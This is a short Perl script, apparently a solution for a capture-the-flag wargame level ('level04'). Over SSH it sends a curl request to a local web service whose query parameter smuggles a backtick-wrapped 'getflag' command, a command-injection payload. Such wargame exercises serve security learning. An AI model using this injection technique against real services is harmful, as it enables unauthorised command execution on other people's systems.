#!/usr/bin/perl

$port = "22222";
$ip = "localhost";
$red = "\e[31m";
$green = "\e[32m";
$reset = "\e[0m";
$user = "level04";

$inject = "curl localhost:4747/?x=\\`getflag\\` 2>/dev/null";
print $red, $inject, $reset, "\n";
system("ssh -qp $port $user\@$ip '$inject'");
